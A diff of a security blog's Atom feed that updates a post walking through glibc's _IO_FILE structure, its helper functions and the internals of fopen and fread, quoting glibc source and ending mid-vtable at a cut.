@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-09-28T14:30:04+02:00</updated>
+    <updated>2022-10-10T00:25:22+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -31,12 +31,12 @@
             
             
             <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
-    <h2 id="introduction">
+    <h1 id="introduction">
         Introduction
         <a data-clipboard-text="https://nasm.re/posts/filestream/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <p>File streams are now a very common attack surface, here is a high level introduction that should make you understand the design of known attacks beyond the code reading for a particular function. I already talked about FSOP <a
   class="gblog-markdown__link"
@@ -54,17 +54,38 @@
   
   >this</a
 > awesome series of articles about the <code>_IO_FILE</code> strcuture.</p>
+
+
+
+  <div class="gblog-toc gblog-toc__level--5">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#global-design">Global design</a></li>
+    <li><a href="#common-functions">Common functions</a></li>
+    <li><a href="#fopen">fopen</a></li>
+    <li><a href="#fread">fread</a>
+      <ul>
+        <li><a href="#_io_file_xsgetn_mmap">_IO_file_xsgetn_mmap</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    <hr />
+  </div>
+
+
 <div class="gblog-post__anchorwrap">
-    <h2 id="global-design">
+    <h1 id="global-design">
         Global design
         <a data-clipboard-text="https://nasm.re/posts/filestream/#global-design" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Global design" href="#global-design">
             <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
         </a>
-    </h2>
+    </h1>
 </div>
 <p>As said in my previous writeup:</p>
 <blockquote>
-<p>Basically on linux “everything is a file” from the character device to any file stream (error, input, output, opened file) we can interact with. To do so, we open it to get a file descriptor on it, right ? This way each file descripor has an associated structure called <code>FILE</code> or <code>_IO_FILE</code> you may have used if you have already done some stuff with files on linux.</p>
+<p>Basically on linux “everything is a file” from the character device the any stream (error, input, output, opened file) we can interact with a resource by just by opening it and getting a file descriptor on it, right ? This way each file descripor has an associated structure called FILE you may have used if you have already done some stuff with files on linux.</p>
 </blockquote>
 <p>The <code>struct _IO_FILE</code> is defined as follows:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
@@ -121,7 +142,7 @@
   <span class="cm">/* Make sure we don&#39;t get into trouble again.  */</span>
   <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)];</span>
 <span class="p">};</span>
-</code></pre></div><p>Before starting to describe each field of the structure, you have to understand that according to the behaviour of the function that uses a file stream, only a small part of the <code>_IO_FILE</code> structure is used. For example if the file stream is byte oriented, <code>_IO_wide_data</code> related operations are not used.</p>
+</code></pre></div><p>Before starting to describe each field of the structure, you have to understand that according to behaviour of the function that uses a file stream, only a small part of the <code>_IO_FILE</code> structure is used. For example if the file stream is byte oriented, <code>_IO_wide_data</code> related operations are not used.</p>
 <p>Let&rsquo;s review the fields of the structure:</p>
 <ul>
 <li><code>_flags</code>: High-order word is <code>_IO_MAGIC</code>, rest is flags.</li>
@@ -139,6 +160,40 @@
 <li><code>_offset</code> stands for the current offset within the file.</li>
 </ul>
 <div class="gblog-post__anchorwrap">
+    <h1 id="common-functions">
+        Common functions
+        <a data-clipboard-text="https://nasm.re/posts/filestream/#common-functions" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Common functions" href="#common-functions">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+<ul>
+<li><code>_IO_setb (FILE *f, char *base, char *end, int do_user_buf)</code>: Initializes the base buffer. Here is its implementation:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L328
+</span><span class="c1"></span>
+<span class="kt">void</span>
+<span class="nf">_IO_setb</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">eb</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_BUF</span><span class="p">))</span>
+    <span class="n">free</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
+  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="n">b</span><span class="p">;</span>
+  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">eb</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_USER_BUF</span><span class="p">;</span>
+  <span class="k">else</span>
+    <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_USER_BUF</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_setb</span><span class="p">)</span>
+</code></pre></div><p><code>_IO_USER_BUF</code>: Don&rsquo;t deallocate buffer on close.</p>
+<ul>
+<li><code>_IO_setg(fp, base, current, end)</code>: Initializes read pointers. Here is its code:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L520
+</span><span class="c1"></span>
+<span class="cp">#define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\
+</span><span class="cp">	(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))
+</span></code></pre></div><div class="gblog-post__anchorwrap">
     <h1 id="fopen">
         fopen
         <a data-clipboard-text="https://nasm.re/posts/filestream/#fopen" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor fopen" href="#fopen">
@@ -541,8 +596,394 @@
 <span class="cp">#endif
 </span><span class="cp"></span>  <span class="k">return</span> <span class="n">fp</span><span class="p">;</span>
 <span class="p">}</span>
-</code></pre></div><p>I think the comment is explicit enough, once <code>__fopen_maybe_mmap</code> is called the <code>fp</code> is returned given the file descriptor has properly been allocated, initialized and that the file is open. Else it means that there are some errors, then the <code>fp</code> is unlinked from the single linked list that stores every file stream, and the <code>locked_FILE</code> is freed, returning <code>NULL</code> indicating an error.</p>
+</code></pre></div><p>I think the comment is enough explicit, once <code>__fopen_maybe_mmap</code> is called the <code>fp</code> is returned given the file descriptor has properly been allocated, initialized and that the file is open. Else it means that there are some errors, then the <code>fp</code> is unlinked from the single linked that stores every file stream, and the <code>locked_FILE</code> is freed, returning <code>NULL</code> indicating an error.</p>
 <p>That&rsquo;s basically how <code>fopen</code> works !</p>
+<div class="gblog-post__anchorwrap">
+    <h1 id="fread">
+        fread
+        <a data-clipboard-text="https://nasm.re/posts/filestream/#fread" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor fread" href="#fread">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+<p>Once a <code>_IO_FILE</code> structure has been initialized and linked into the <code>_IO_list_all</code> single linked list, several operations can occur. A basic primitive would be to read data from a file, that&rsquo;s what fread does with the use of certain fields of <code>_IO_FILE</code>.</p>
+<p>Here is a basic description of what <code>fread</code> does, the schema comes from <a
+  class="gblog-markdown__link"
+  href="https://ray-cp.github.io/archivers/IO_FILE_fread_analysis"
+  
+  >the incredible article of raycp</a
+>.</p>
+<p align="center" width="100%">
+    fread algorithm.<br>
+    <img width="80%" src="/fread.png">
+    </br>
+</p>
+<p>According to the man: &ldquo;The function fread() reads nmemb items of data, each size bytes long, from the stream pointed to by stream, storing them at the location given by ptr.&rdquo;. Now let&rsquo;s dig deeper within the code. <code>fread</code> is defined there:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/iofread.c#L30
+</span><span class="c1"></span>
+<span class="n">size_t</span>
+<span class="nf">_IO_fread</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">size_t</span> <span class="n">bytes_requested</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="n">count</span><span class="p">;</span>
+  <span class="n">size_t</span> <span class="n">bytes_read</span><span class="p">;</span>
+  <span class="n">CHECK_FILE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">bytes_requested</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">_IO_sgetn</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">,</span> <span class="n">bytes_requested</span><span class="p">);</span>
+  <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">bytes_requested</span> <span class="o">==</span> <span class="n">bytes_read</span> <span class="o">?</span> <span class="nl">count</span> <span class="p">:</span> <span class="n">bytes_read</span> <span class="o">/</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_fread</span><span class="p">)</span>
+</code></pre></div><p>If the amount of requested bytes is null, zero is returned. <code>CHECK_FILE</code> checks (if <code>IO_DEBUG</code> is enabled) if <code>fp</code> exists and if <code>fp-&gt;flags</code> is properely structured:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L866
+</span><span class="c1"></span>
+<span class="cp">#ifdef IO_DEBUG
+</span><span class="cp"># define CHECK_FILE(FILE, RET) do {				\
+</span><span class="cp">    if ((FILE) == NULL						\
+</span><span class="cp">	|| ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)	\
+</span><span class="cp">      {								\
+</span><span class="cp">	__set_errno (EINVAL);					\
+</span><span class="cp">	return RET;						\
+</span><span class="cp">      }								\
+</span><span class="cp">  } while (0)
+</span><span class="cp">#else
+</span><span class="cp"># define CHECK_FILE(FILE, RET) do { } while (0)
+</span><span class="cp">#endif
+</span></code></pre></div><p>Then <code>_IO_sgetn</code> is called:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L408
+</span><span class="c1"></span>
+<span class="n">size_t</span>
+<span class="nf">_IO_sgetn</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">n</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/* FIXME handle putback buffer here! */</span>
+  <span class="k">return</span> <span class="n">_IO_XSGETN</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_sgetn</span><span class="p">)</span>
+</code></pre></div><p>When this is the first time <code>_IO_sgetn</code> is called, on most of the platforms (the one which support <code>mmap</code>) the <code>vtable</code> is initialized to <code>_IO_file_jumps_maybe_mmap</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1481
+</span><span class="c1"></span>
+<span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_file_jumps_maybe_mmap</span> <span class="n">libio_vtable</span> <span class="o">=</span>
+<span class="p">{</span>
+  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_file_finish</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow_maybe_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_new_file_xsputn</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn_maybe_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_file_seekoff_maybe_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">)</span> <span class="n">_IO_file_setbuf_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_new_file_sync</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_file_doallocate</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
+<span class="p">};</span>
+</code></pre></div><p>Which means <code>_IO_sgetn</code> calls <code>_IO_file_xsgetn_maybe_mmap</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1409
+</span><span class="c1"></span>
+<span class="k">static</span> <span class="n">size_t</span>
+<span class="nf">_IO_file_xsgetn_maybe_mmap</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">n</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/* We only get here if this is the first attempt to read something.
+</span><span class="cm">     Decide which operations to use and then punt to the chosen one.  */</span>
+
+  <span class="n">decide_maybe_mmap</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">_IO_XSGETN</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p><code>decide_maybe_mmap</code> is basicaly trying to map the file, if it succeeds the <code>vtable</code> is initialized to <code>&amp;_IO_file_jumps_mmap</code> else it&rsquo;s initialized to <code>&amp;_IO_file_jumps</code>. The function is pretty easy to read, except maybe for the <code>S_ISREG (st.st_mode) &amp;&amp; st.st_size != 0</code> that checks if it is a regular file and if its size isn&rsquo;t null. Here is the full code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L658
+</span><span class="c1"></span>
+<span class="k">static</span> <span class="kt">void</span>
+<span class="nf">decide_maybe_mmap</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/* We use the file in read-only mode.  This could mean we can
+</span><span class="cm">     mmap the file and use it without any copying.  But not all
+</span><span class="cm">     file descriptors are for mmap-able objects and on 32-bit
+</span><span class="cm">     machines we don&#39;t want to map files which are too large since
+</span><span class="cm">     this would require too much virtual memory.  */</span>
+  <span class="k">struct</span> <span class="n">__stat64_t64</span> <span class="n">st</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_SYSSTAT</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
+      <span class="o">&amp;&amp;</span> <span class="n">S_ISREG</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_mode</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span> <span class="o">!=</span> <span class="mi">0</span>
+      <span class="cm">/* Limit the file size to 1MB for 32-bit machines.  */</span>
+      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">ptrdiff_t</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
+      <span class="cm">/* Sanity check.  */</span>
+      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span> <span class="o">||</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">&lt;=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="cm">/* Try to map the file.  */</span>
+      <span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+
+      <span class="n">p</span> <span class="o">=</span> <span class="n">__mmap64</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
+	<span class="p">{</span>
+	  <span class="cm">/* OK, we managed to map the file.  Set the buffer up and use a
+</span><span class="cm">	     special jump table with simplified underflow functions which
+</span><span class="cm">	     never tries to read anything from the file.  */</span>
+
+	  <span class="k">if</span> <span class="p">(</span><span class="n">__lseek64</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">)</span> <span class="o">!=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span>
+	    <span class="p">{</span>
+	      <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>
+	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
+	    <span class="p">}</span>
+	  <span class="k">else</span>
+	    <span class="p">{</span>
+	      <span class="n">_IO_setb</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">p</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+	      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
+		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+	      <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">p</span> <span class="o">+</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">p</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>
+	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
+
+	      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+		<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps_mmap</span><span class="p">;</span>
+	      <span class="k">else</span>
+		<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps_mmap</span><span class="p">;</span>
+	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps_mmap</span><span class="p">;</span>
+
+	      <span class="k">return</span><span class="p">;</span>
+	    <span class="p">}</span>
+	<span class="p">}</span>
+    <span class="p">}</span>
+
+  <span class="cm">/* We couldn&#39;t use mmap, so revert to the vanilla file operations.  */</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps</span><span class="p">;</span>
+  <span class="k">else</span>
+    <span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps</span><span class="p">;</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>Two operations are very important to note in this function. First, <code>_IO_setb</code> (<a
+  class="gblog-markdown__link"
+  href="#common-functions"
+  
+  >take a look at this</a
+>) is called to initialize the begin of the  base buffer to the begin of the memory mapping of the file, the end of the base buffer is then initialized to the end of the file (<code>p + st.st_size</code>). Right after <code>_IO_setg</code> (<a
+  class="gblog-markdown__link"
+  href="#common-functions"
+  
+  >take a look at this</a
+>) is called to initialize the read buffer of the file, the base of the read buffer is initialized to the mapping of the file, the current pointer to <code>p + fp-&gt;_offset</code> and the end of the buffer to the end of the file mapping.</p>
+<p>Then according to what <code>vtable</code> is used, the <code>xsgetn</code> is distinct:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1457
+</span><span class="c1"></span>
+<span class="c1">// vtable if the file is maped
+</span><span class="c1"></span><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_file_jumps_mmap</span> <span class="n">libio_vtable</span> <span class="o">=</span>
+<span class="p">{</span>
+  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_file_finish</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_new_file_xsputn</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_file_seekoff_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">)</span> <span class="n">_IO_file_setbuf_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_file_sync_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_file_doallocate</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close_mmap</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
